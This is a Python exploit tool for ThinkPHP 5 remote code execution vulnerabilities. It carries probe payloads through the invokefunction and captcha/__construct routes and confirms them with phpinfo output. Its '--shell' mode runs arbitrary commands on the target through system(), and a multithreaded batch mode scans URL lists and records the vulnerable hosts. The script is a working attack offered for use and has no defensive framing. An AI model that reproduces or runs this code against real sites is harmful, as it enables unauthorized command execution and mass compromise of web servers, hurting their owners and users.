import requests
import sys
import optparse
import threading
import os
import queue
import datetime
from requests.packages import urllib3

headers={
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0'
}

session=requests.session()

lock=threading.Lock()

q1=queue.Queue()

command1=''

threadlist=[]

poclist=[
	'/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinf&vars[1][]=1',
	'/index.php/?s=captcha'
]

explist=[
	'/index.php/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=',
	'/index.php/?s=captcha'
]

pocdatalist=[
	{
	'_method':'__construct',
	'method':'get',
	'filter':'call_user_func',
	'get[]':'phpinfo'
	},
	{'_method':'__construct',
		'method':'get',
		'filter':'call_user_func',
		'server[REQUEST_METHOD]':'phpinfo'
	}
]


def tp5_rce_check(url):
	succ=0
	result=''
	for poc in poclist:
		index=poclist.index(poc)
		tgurl=url+poc
		try:
			if index==0:
				r=session.get(tgurl,headers=headers,verify=False)
				result+=r.text
			else:
				for pocdata in pocdatalist:
					r=session.post(tgurl,headers=headers,data=pocdata,verify=False)
					result+=r.text
			if 'PHP Version' in result:
				succ+=1
				global pocindex
				pocindex=index
				break
			
		except:
			print('[!] Destination address cannot be connected')
			return False
	if succ==1:
		print('[+] Remote code execution vulnerability exists at the target address')
		return True
	else:
		print('[-] There is no remote code execution vulnerability in the target address')
		return False


def tp5_rce_shell(url):	

	while True:
		command=input("shell$")

		if command != "exit":

			if pocindex==0:
				shell=url+explist[0]+str(command)
				r=session.get(shell,headers=headers,verify=False)
			else:
				expdata={
					'_method':'__construct',
					'method':'get',
					'filter':'system',
					'get[]':command
				}
				tgurl=url+explist[pocindex]
				print(expdata)
				r=session.post(tgurl,headers=headers,data=expdata,verify=False)
			print(r.text)
		else:
			break

def tp5_rce_file(file,threads=5):
	current_time=datetime.datetime.now().strftime('%Y%m%d%H%M%S')
	os.makedirs('./result/'+str(current_time))
	file_succ=open('result/'+str(current_time)+'/'+'success.txt','w')
	urlfile=open(file)

	for url in urlfile:
		furl=url.strip()
		q1.put(furl)

	for thread in range(threads):
		t=threading.Thread(target=tp5_rce_batch,args=(file_succ,))
		t.start()
		threadlist.append(t)

	for t in threadlist:
		t.join()

	print('*****Finished!*****')
	print('Results were saved in result/'+str(current_time)+'/')
	file_succ.close()
	urlfile.close()

def tp5_rce_batch(file):
	urllib3.disable_warnings()

	while q1.empty()!=True:
		tgUrl=q1.get()
		result=''
		succ=0
		for poc in poclist:
			url=tgUrl+poc
			try:
				if poclist.index(poc)==0:
					r=session.get(url,headers=headers,verify=False)
					result+=r.text
				else:
					for pocdata in pocdatalist:
						r=session.post(url,headers=headers,data=pocdata,verify=False)
						result+=r.text
				if 'PHP Version' in result:
					succ+=1
					break
			except:
				continue

		if succ==1:
			print('{:<50}SUCCESS!'.format(tgUrl))
			lock.acquire()
			file.write(tgUrl+'\n')
			lock.release()
			break
		else:
			print('{:<50}FIAL!'.format(tgUrl))
		



if __name__=='__main__':

	print('''
		****************************************************
		*                   thinkphp5 rce                  *
		*                   Coded by Longtao               *
		****************************************************
		''')

	parser=optparse.OptionParser('python %prog ' +'-h (manual)',version='%prog v1.0')

	parser.add_option('-u', dest='tgUrl', type='string', help='single url')

	parser.add_option('-r', dest='tgUrlFile', type ='string', help='urls filepath[exploit default]')
	
	parser.add_option('-t', dest='threads', type='int', default=5, help='the number of threads')

	parser.add_option('--shell', dest='shell',action='store_true', help='cmd shell mode')

	(options,args)=parser.parse_args()

	tgUrl=options.tgUrl

	tgUrlFile=options.tgUrlFile

	threads=options.threads

	shell=options.shell

	if tgUrl:
		tp5_rce_check(tgUrl)
		if shell:
			tp5_rce_shell(tgUrl)

	elif tgUrlFile:
		tp5_rce_file(tgUrlFile,threads)

	else:
		print('[-] Error! example：tp5-rce.py -u http://xxx.com')







